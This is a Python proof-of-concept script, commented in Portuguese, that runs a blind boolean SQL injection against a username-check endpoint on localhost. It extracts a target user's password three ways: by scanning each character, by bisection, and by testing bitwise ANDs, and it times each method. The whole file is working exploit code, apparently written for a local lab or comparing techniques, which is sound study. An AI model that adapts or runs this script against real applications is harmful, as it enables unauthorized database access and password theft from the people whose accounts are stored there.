#!/usr/bin/python3

import requests
import json
import sys
import time
from urllib.parse import quote_plus

# O usuário alvo
target = "antonio"

# Contador para o número de requisições
request_count = 0

# Função que verifica se a consulta `q` avalia como `true` ou `false`
def oracle(q):
    global request_count
    request_count += 1
    # Monta o payload com a SQL Injection
    payload = quote_plus(f"{target}' AND {q}); -- -")
    # Envia a requisição para o endpoint
    r = requests.get(f"http://localhost:8081/check-username?username={payload}")
    # Carrega a resposta JSON
    j = json.loads(r.text)
    
    # Avalia se a mensagem indica que o usuário é "indisponivel"
    return j['message'] == 'usuario indisponivel'

# Testa se o oracle funciona com `1=1` e `1=0`
assert oracle("'1'='1'")  # Deve ser verdadeiro
assert not oracle("'1'='0'")  # Deve ser falso

# Função para descobrir o comprimento da senha
def dumpLength():
    length = 0
    max_length = 128  # Limite de segurança para evitar loops infinitos
    while not oracle(f"LENGTH(password)={length}"):
        length += 1
        if length > max_length:
            print(f"[ERROR] Loop excedeu o limite de {max_length}. Interrompendo.")
            return -1
    print(f"[*] Comprimento da senha = {length}")
    return length

# Função para obter o número de linhas na tabela
def getRowCount():
    row_count = 0
    while oracle(f"(SELECT COUNT(*) FROM users) > {row_count}"):
        row_count += 1
    return row_count

# Função para dumpar a senha usando abordagem básica
def dumpPassword(length):
    global request_count
    request_count = 0  # Reset request count
    start_time = time.time()
    
    print("[*] Password (basic) = ", end='')
    for i in range(1, length + 1):
        for c in range(32, 127):  # ASCII printable characters
            if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
                print(chr(c), end='')
                sys.stdout.flush()
                break
    print()

    end_time = time.time()
    print(f"[*] REQUISIÇÕES: {request_count}")
    print(f"[*] TEMPO GASTO: {end_time - start_time:.2f} seconds")

# Dummp de senha usando bisection
def dumpPasswordBisection(length):
    global request_count
    request_count = 0  # Reset request count
    start_time = time.time()
    
    print("[*] Password (bisection) = ", end='')
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            if oracle(f"ASCII(SUBSTRING(password,{i},1)) <= {mid}"):
                high = mid - 1
            else:
                low = mid + 1
        print(chr(low), end='')
        sys.stdout.flush()
    print()

    end_time = time.time()
    print(f"[*] REQUISIÇÕES: {request_count}")
    print(f"[*] TEMPO GASTO: {end_time - start_time:.2f} seconds")

# Dump de senha usando SQL-Anding
def dumpPasswordSQLAnding(length):
    global request_count
    request_count = 0  # Reset request count
    start_time = time.time()
    
    print("[*] Password (SQL-Anding) = ", end='')
    for i in range(1, length + 1):
        c = 0
        for p in range(7):  # Checa 7 bits (ASCII)
            if oracle(f"ASCII(SUBSTRING(password,{i},1)) & {2**p} > 0"):
                c |= 2**p
        print(chr(c), end='')
        sys.stdout.flush()
    print()

    end_time = time.time()
    print(f"[*] REQUISIÇÕES: {request_count}")
    print(f"[*] TEMPO GASTO: {end_time - start_time:.2f} seconds")

# Execução principal
if __name__ == "__main__":
    print("[*] Iniciando a PoC...")

    # Obter o número de linhas na tabela
    row_count = getRowCount()
    print(f"[*] A tabela `users` possui {row_count} linha(s).")

    # Obter o comprimento da senha
    length = dumpLength()
    if length == -1:
        sys.exit("[ERROR] Falha ao determinar o comprimento da senha.")

    # Dumpar a senha usando diferentes métodos
    print("\n[*] Usando método SUBSTRING:")
    dumpPassword(length)

    print("\n[*] Usando Bisection:")
    dumpPasswordBisection(length)

    print("\n[*] Usando SQL-Anding:")
    dumpPasswordSQLAnding(length)